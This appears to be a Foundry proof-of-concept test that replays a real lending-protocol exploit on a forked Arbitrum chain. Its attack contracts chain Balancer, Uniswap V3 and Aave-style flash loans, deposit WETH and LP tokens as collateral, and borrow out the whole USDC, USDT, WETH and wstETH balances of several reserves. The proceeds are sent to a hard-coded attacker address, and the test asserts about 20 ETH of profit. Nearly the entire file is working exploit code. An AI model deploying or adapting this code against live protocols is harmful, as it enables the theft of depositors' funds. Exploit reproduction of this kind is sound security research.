
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 195240642;
    uint256 constant TX_TIMESTAMP = 1711666653;
    uint256 constant TX_BLOCK_NUMBER = 195240643;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchChildRuntimes();
        _bindAttackChildren(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _etchChildRuntimes() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8988, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9B5C, type(AttackChild).runtimeCode);
    }

    function _bindAttackChildren(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 20332763573538003060);
    }
}

contract OurAttack {
    AttackChild public reserveBorrowChild;

    AttackChild public flashLoanChild;
    AttackChild public wethLoopChild;

    function _ctorBootstrap() internal {
        if (address(reserveBorrowChild) == address(0)) {
            reserveBorrowChild = AttackChild(payable(Addresses.attack_child));
        }
        if (address(flashLoanChild) == address(0)) {
            flashLoanChild = AttackChild(payable(Addresses.attack_child_8988));
        }
        if (address(wethLoopChild) == address(0)) {
            wethLoopChild = AttackChild(payable(Addresses.attack_child_9B5C));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(reserveBorrowChild);
    }

    function attack() external payable {
        if (address(reserveBorrowChild) == address(0)) _ctorBootstrap();
        _startBalancerLoan();
    }

    function _startBalancerLoan() internal {
        _requireChildCode(address(flashLoanChild));
        AttackChild(payable(address(flashLoanChild))).noteEmptyEntry();
        AttackChild(payable(address(flashLoanChild))).startBalancerLoan();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x848f244a) {
            _startBalancerLoan();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        reserveBorrowChild = AttackChild(payable(Addresses.attack_child));
        flashLoanChild = AttackChild(payable(Addresses.attack_child_8988));
        wethLoopChild = AttackChild(payable(Addresses.attack_child_9B5C));
    }

    function bindAttackChild(address attackChildAddress) external {
        reserveBorrowChild = AttackChild(payable(attackChildAddress));
    }

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[sig];
        _dispatchCursor[sig] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _requireChildCode(address child) internal view {
        require(child.code.length != 0, "attack child runtime missing");
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _uintArray2(uint256 a0, uint256 a1) internal pure returns (uint256[] memory out) {
        out = new uint256[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _uintArray3(uint256 a0, uint256 a1, uint256 a2) internal pure returns (uint256[] memory out) {
        out = new uint256[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }
}

contract AttackChild {
    receive() external payable {}

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        assets;
        amounts;
        premiums;
        initiator;
        params;
        _aaveFlashCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    function borrow(uint256 amount) external payable {
        amount;
        _borrowReserves();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata callbackData) external payable {
        amount0;
        amount1;
        callbackData;
        uint256 callbackSequenceIndex = _nextDispatch(0xe9cbafb0);
        if (callbackSequenceIndex == 0) {
            flashCallback();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 1) {
            flashCallback2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 2) {
            flashCallback3();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        flashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        tokens;
        amounts;
        feeAmounts;
        userData;
        balancerFlashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata callbackData)
        external
        payable
    {
        amount0Delta;
        amount1Delta;
        callbackData;
        uint256 callbackSequenceIndex = _nextDispatch(0xfa461e33);
        if (callbackSequenceIndex == 0) {
            swapCallback();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 1) {
            swapCallback2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        swapCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x94c34287) {
            _depositWethBorrowLp();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0x96869939) {
            startBalancerLoan();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function execOp() external payable {
        _aaveFlashCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function depositWethBorrowLp() external payable {
        _depositWethBorrowLp();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function startBalancerLoan() public payable {
        _startBalancerLoan();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function borrowReserves() external payable {
        _borrowReserves();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function balancerFlash() external payable {
        balancerFlashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback() public payable {
        _aaveNestedFlash();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback2() public payable {
        _runLpLoop();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function swapCallback() public payable {
        _repayUsdcE();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback3() public payable {
        _repayUsdc();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function swapCallback2() public payable {
        _repayUsdc2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function repayBalancerVault() external {
        _repayBalancerT(Addresses.WETH, 2332918377393619426424);
        _repayBalancerT(Addresses.USDC_5831, 2093333958168);
        _repayBalancerT(Addresses.USDC_5CC8, 2789629246439);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerT(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerT(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.Vault_BA1222, amount);
    }

    function _entryCb() internal {}

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[sig];
        _dispatchCursor[sig] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _uintArray2(uint256 a0, uint256 a1) internal pure returns (uint256[] memory out) {
        out = new uint256[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _uintArray3(uint256 a0, uint256 a1, uint256 a2) internal pure returns (uint256[] memory out) {
        out = new uint256[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _borrowReserves() internal {
        uint256 usdc5cc8BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cba9 = IERC20Like(
                Addresses.USDC_5CC8
            ).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_16CBA9);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            )
            .borrow(
                Addresses.USDC_5CC8,
                usdc5cc8BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cba9,
                2,
                uint16(0),
                address(this)
            );
        IERC20Like(Addresses.USDC_5CC8)
            .transfer(
                Addresses.attack_child_8988, usdc5cc8BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cba9
            );
        uint256 usdc5831BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cb62 = IERC20Like(
                Addresses.USDC_5831
            ).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_16CB62);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            )
            .borrow(
                Addresses.USDC_5831,
                usdc5831BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cb62,
                2,
                uint16(0),
                address(this)
            );
        IERC20Like(Addresses.USDC_5831)
            .transfer(
                Addresses.attack_child_8988, usdc5831BalanceOfInitializableImmutableAdminUpgradeabilityProxy16cb62
            );
        uint256 usdtBalanceOfInitializableImmutableAdminUpgradeabilityProxy8da6bc = IERC20Like(Addresses.USDT)
            .balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_8DA6BC);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            )
            .borrow(
                Addresses.USDT,
                usdtBalanceOfInitializableImmutableAdminUpgradeabilityProxy8da6bc,
                2,
                uint16(0),
                address(this)
            );
        IERC20Like(Addresses.USDT)
            .transfer(
                Addresses.attack_child_8988, usdtBalanceOfInitializableImmutableAdminUpgradeabilityProxy8da6bc
            );
        uint256 wethBalanceOfAWETH = IERC20Like(Addresses.WETH).balanceOf(Addresses.aWETH);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).borrow(Addresses.WETH, wethBalanceOfAWETH, 2, uint16(0), address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.attack_child_8988, wethBalanceOfAWETH);
        uint256 wstETH0529BalanceOfInitializableImmutableAdminUpgradeabilityProxyCb1332 = IERC20Like(
                Addresses.wstETH_0529
            ).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_CB1332);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            )
            .borrow(
                Addresses.wstETH_0529,
                wstETH0529BalanceOfInitializableImmutableAdminUpgradeabilityProxyCb1332,
                2,
                uint16(0),
                address(this)
            );
        IERC20Like(Addresses.wstETH_0529)
            .transfer(
                Addresses.attack_child_8988,
                wstETH0529BalanceOfInitializableImmutableAdminUpgradeabilityProxyCb1332
            );
    }

    function noteEmptyEntry() public {}

    function _aaveFlashCallback() internal {
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        bytes memory flashData = abi.encode(0x00000000000000000000000000000274bAa3B818);
        IUniswapV3Pool_A443(Addresses.UniswapV3Pool_A443).flash(address(this), 0, 2700370753560, flashData);
        IERC20Like(Addresses.USDC_5831)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, 1856605354619);
        uint256 usdc5cc8ApproveAllowance = 1;
        IERC20Like(Addresses.USDC_5CC8)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, usdc5cc8ApproveAllowance);
    }

    function _startBalancerLoan() internal {
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).getAssets();
        IERC20Like(Addresses.USDC_5831)
            .balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_16CB62);
        IERC20Like(Addresses.USDC_5CC8)
            .balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_16CBA9);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_8DA6BC);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.aWETH);
        IERC20Like(Addresses.wstETH_0529)
            .balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_CB1332);
        IERC20Like(Addresses.USDC_5831).balanceOf(Addresses.Vault_BA1222);
        IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.Vault_BA1222);
        _recordBalancerPre(_addressArray3(Addresses.WETH, Addresses.USDC_5831, Addresses.USDC_5CC8));
        if (address(this) != address(this)) {
            (bool preBalanceShared,) = address(this)
                .call(
                    abi.encodeWithSignature(
                        "recordBalancerPre(address[])",
                        _addressArray3(Addresses.WETH, Addresses.USDC_5831, Addresses.USDC_5CC8)
                    )
                );
            preBalanceShared;
        }
        IVault_BA1222(Addresses.Vault_BA1222)
            .flashLoan(
                address(this),
                _addressArray3(Addresses.WETH, Addresses.USDC_5831, Addresses.USDC_5CC8),
                _uintArray3(2332918377393619426424, 2093333958168, 2789629246439),
                hex""
            );
        IERC20Like(Addresses.USDC_USDC_LP).balanceOf(address(this));
        uint256 usdc5831BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5831).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5831).transfer(Addresses.attacker_eoa, usdc5831BalanceOfAttackHelper);
        uint256 usdc5cc8BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, usdc5cc8BalanceOfAttackHelper);
        uint256 wstETH0529BalanceOfAttackHelper = IERC20Like(Addresses.wstETH_0529).balanceOf(address(this));
        IERC20Like(Addresses.wstETH_0529).transfer(Addresses.attacker_eoa, wstETH0529BalanceOfAttackHelper);
        uint256 usdtBalanceOfAttackHelper = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtBalanceOfAttackHelper);
        uint256 wethBalanceOfAttackHelper = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackHelper);
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 0x11a2d18dda55059f4) nativeTransferAmount = 0x11a2d18dda55059f4;
        (bool nativeProfitSent,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
        if (!nativeProfitSent) {}
    }

    function _repayUsdc() internal {
        IERC20Like(Addresses.USDC_5831).transfer(Addresses.UniswapV3Pool, 26001000000);
    }

    function _runLpLoop() internal {
        IERC20Like(Addresses.USDC_5831).approve(Addresses.USDC_USDC_LP, type(uint256).max);
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.USDC_USDC_LP, type(uint256).max);
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).deposit(1000000000, 1000000000, 0, 0);
        _requireChildCode(Addresses.attack_child_9B5C);
        AttackChild(payable(Addresses.attack_child_9B5C)).noteEmptyEntry2();
        IERC20Like(Addresses.WETH).transfer(Addresses.attack_child_9B5C, 35735259567507709558);
        AttackChild(payable(Addresses.attack_child_9B5C)).depositWethBorrowLp();
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), false, int256(5490000000000), uint160(79232123823359799118287999568), hex"");
        uint256 usdcUsdcLpBalanceOfAttackHelper = IERC20Like(Addresses.USDC_USDC_LP).balanceOf(address(this));
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).withdraw(usdcUsdcLpBalanceOfAttackHelper);
        IERC20Like(Addresses.USDC_5831).approve(Addresses.USDC_USDC_LP, type(uint256).max);
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.USDC_USDC_LP, type(uint256).max);
        uint256 usdcLpDeposit0 = 3200424537297;
        uint256 usdcLpDeposit1 = 3200744579750;
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).deposit(usdcLpDeposit0, usdcLpDeposit1, 0, 0);
        uint256 smallLpDeposit0 = 64008490745;
        uint256 smallLpDeposit1 = 64014891595;
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).deposit(smallLpDeposit0, smallLpDeposit1, 0, 0);
        IERC20Like(Addresses.USDC_USDC_LP)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049, type(uint256).max);
        IERC20Like(Addresses.WETH)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049, type(uint256).max);
        uint256 wethBalanceOfAttackHelper = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).deposit(Addresses.WETH, wethBalanceOfAttackHelper, address(this), uint16(0));
        IERC20Like(Addresses.USDC_USDC_LP).balanceOf(address(this));
        uint256 lpDepositAmount = 63383659993147186;
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).deposit(Addresses.USDC_USDC_LP, lpDepositAmount, address(this), uint16(0));
        _requireChildCode(Addresses.attack_child);
        AttackChild(payable(Addresses.attack_child)).noteEmptyEntry();
        uint256 ausdcUsdcLPBalanceOfAttackHelper = IERC20Like(Addresses.ausdcUsdcLP).balanceOf(address(this));
        IERC20Like(Addresses.ausdcUsdcLP).transfer(Addresses.attack_child, ausdcUsdcLPBalanceOfAttackHelper);
        uint256 usdcUsdcLpBalanceOfAusdcUsdcLP =
            IERC20Like(Addresses.USDC_USDC_LP).balanceOf(Addresses.ausdcUsdcLP);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).borrow(Addresses.USDC_USDC_LP, usdcUsdcLpBalanceOfAusdcUsdcLP, 2, uint16(0), address(this));
        uint256 usdcUsdcLpBalanceOfAttackHelper_2 = IERC20Like(Addresses.USDC_USDC_LP).balanceOf(address(this));
        IUSDC_USDC_LP(Addresses.USDC_USDC_LP).withdraw(usdcUsdcLpBalanceOfAttackHelper_2);
        bytes memory lpFlashData = hex"";
        IUniswapV3Pool(Addresses.UniswapV3Pool).flash(address(this), 1000000, 0, lpFlashData);
        AttackChild(payable(Addresses.attack_child)).borrow(3567);
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), true, int256(-840089721144), uint160(79188560314459151373725315960), hex"");
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.UniswapV3Pool_A443, 2701720938937);
    }

    function _aaveNestedFlash() internal {
        IERC20Like(Addresses.USDC_5831).balanceOf(address(this));
        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
            )
            .flashLoan(
                address(this),
                _addressArray2(Addresses.USDC_5831, Addresses.USDC_5CC8),
                _uintArray2(1847368512059, 1),
                _uintArray2(0, 0),
                address(this),
                hex"",
                uint16(0)
            );
        uint256 usdcRepaymentDust = 2;
        IERC20Like(Addresses.USDC_5831).transfer(Addresses.UniswapV3Pool_E8D0, usdcRepaymentDust);
    }

    function balancerFlashCallback() public {
        IERC20Like(Addresses.USDC_5831).balanceOf(Addresses.UniswapV3Pool_E8D0);
        bytes memory flashData = abi.encode(0x0000000000000000000000000000000000000001);
        IUniswapV3Pool_E8D0(Addresses.UniswapV3Pool_E8D0).flash(address(this), 0, 1, flashData);
        IERC20Like(Addresses.WETH).transfer(Addresses.Vault_BA1222, 2332918377393619426424);
        uint256 usdc5831Repay = 2093333958168;
        IERC20Like(Addresses.USDC_5831).transfer(Addresses.Vault_BA1222, usdc5831Repay);
        uint256 usdc5cc8Repay = 2789629246439;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.Vault_BA1222, usdc5cc8Repay);
    }

    function _repayUsdc2() internal {
        IERC20Like(Addresses.USDC_5831).transfer(Addresses.UniswapV3Pool, 838369368553);
    }

    function _repayUsdcE() internal {
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.UniswapV3Pool, 840199785476);
    }

    function noteEmptyEntry3() public {}

    function noteEmptyEntry4() public {}

    function _depositWethBorrowLp() internal {
        IERC20Like(Addresses.WETH)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049, type(uint256).max);
        uint256 wethDepositAmount = 35735259567507709558;
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).deposit(Addresses.WETH, wethDepositAmount, address(this), uint16(0));
        IERC20Like(Addresses.USDC_USDC_LP).balanceOf(Addresses.ausdcUsdcLP);
        IInitializableImmutableAdminUpgradeabilityProxy_403049(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_403049
            ).borrow(Addresses.USDC_USDC_LP, 988680292585834, 2, uint16(0), address(this));
        uint256 usdcUsdcLpTransferAmount = 988680292585834;
        IERC20Like(Addresses.USDC_USDC_LP).transfer(Addresses.attack_child_8988, usdcUsdcLpTransferAmount);
    }

    function noteEmptyEntry2() public {}

    function _requireChildCode(address child) internal view {
        require(child.code.length != 0, "attack child runtime missing");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant DefaultReserveInterestRateStrategy = 0x06B1Ec378618EA736a65395eA5CAB69A2410493B;
    address internal constant wstETH = 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921;
    address internal constant USDC_USDC_LP = 0x10bdA01aC4E644fD84a04Dab01E15A5eDcEE46dD;
    address internal constant variableDebtUSDT = 0x11cF2e45B03bA7838e809a3cbE6212aD42E07EF6;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_16CB62 =
        0x16Cb622CaE7Ad9fd2b0780b2026ED301414781fE;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_16CBA9 =
        0x16cba9A6a9BB38e339D4250dA0Afd919c6bDBDfE;
    address internal constant A_17359E_5B45 = 0x17359EEA0c646F1D3FaaE74ADE8A5Eb831F25B45;
    address internal constant ausdcUsdcLP = 0x1e482f0606152890F84dD59617e13EC06581B45a;
    address internal constant USDC = 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8;
    address internal constant stableDebtWETH = 0x27772017e117715a4bd353fDBB0780f040D27EAa;
    address internal constant DEBTTOKEN_IMPL = 0x2cE61b0C142A0F6060aF1BF1E7A0aA55CCD3e908;
    address internal constant attack_contract = 0x3E52c217A902002ca296FE6769C22FEDAEE9fdA1;
    address internal constant stableDebtUSDC = 0x3F111d2fFf581532Bb1edc08062a7919246B9bEF;
    address internal constant attack_child = 0x3fcC17a935EA06bE79850C880C18d52F3dDfe2Ee;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_403049 =
        0x403049E886b13E42C149f15450CEB795216cddC6;
    address internal constant attack_child_8988 = 0x42FaE47296B26385C4A5b62C46e4305A27c88988;
    address internal constant A_440564_AA88 = 0x440564f67B02B459Ca04f21d13d27DEC6eEBaa88;
    address internal constant variableDebtWETH = 0x57aF4149a989F6E8028f1E72d6768774aE667ec1;
    address internal constant wstETH_0529 = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_625E77 =
        0x625E7708f30cA75bfd92586e17077590C60eb4cD;
    address internal constant stableDebtUSDT = 0x6289B840396DA0f425eB1CC2153Cfe28Ee26d37b;
    address internal constant DEBTTOKEN_IMPL_7FD9 = 0x628cdA3335ab4240c25a01295618B21c95237fd9;
    address internal constant A_642A8D_FCC1 = 0x642a8DAcC59b73491Dcaa3BCeF046D660901fCc1;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_724DC8 =
        0x724dc807b04555b71ed48a6896b6F41593b8C637;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant attacker_eoa = 0x851aa754C39bF23cdaAC2025367514DFd7530418;
    address internal constant A_86E721_57B3 = 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3;
    address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668;
    address internal constant variableDebtUSDC = 0x8BF047567eFB281C7801cd9d3d0F2262b0D61631;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_8DA6BC =
        0x8Da6Bc74B2534030cD38C996C395B914990fa684;
    address internal constant UniswapV3Pool = 0x8e295789c9465487074a65b1ae9Ce0351172393f;
    address internal constant stableDebtUSDCe = 0x8f6E8154eD5c81535E52EDb13f4b70F48aE59dcA;
    address internal constant USDC_5831 = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant variableDebtUSDCe = 0xC1d4418588726d4dB0561E1FE67049daba1ca751;
    address internal constant UniswapV3Pool_A443 = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
    address internal constant UniswapV3Pool_E8D0 = 0xC6962004f452bE9203591991D15f6b388e09E8D0;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_CB1332 =
        0xCB1332663a39f238BCD1cc7621E3E24A50251b94;
    address internal constant ATOKEN_IMPL = 0xD095622D98a781e0bA1Ef15A76FFA0051eeA78E7;
    address internal constant DefaultReserveInterestRateStrategy_A8EF = 0xE759cc46454f8c1C08bA0fBf8F931E80f124a8eF;
    address internal constant aWETH = 0xec9b99C8262b72d846F0F80fCE76AF7D3c7c6AF6;
    address internal constant ArbitrumExtension = 0xf31e1AE27e7cd057C1D6795a5a083E0453D39B50;
    address internal constant UniV3Wrapper = 0xF6b3C18023C1e387A673B3101C73FC985290FBD9;
    address internal constant USDT = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
    address internal constant attack_child_9B5C = 0xfF388fB92190136032C80a5B791CFEbAF7fb9b5c;
    address internal constant USDC_5CC8 = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_403049 {
    function borrow(address, uint256, uint256, uint16, address) external;
    function deposit(address, uint256, address, uint16) external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
}

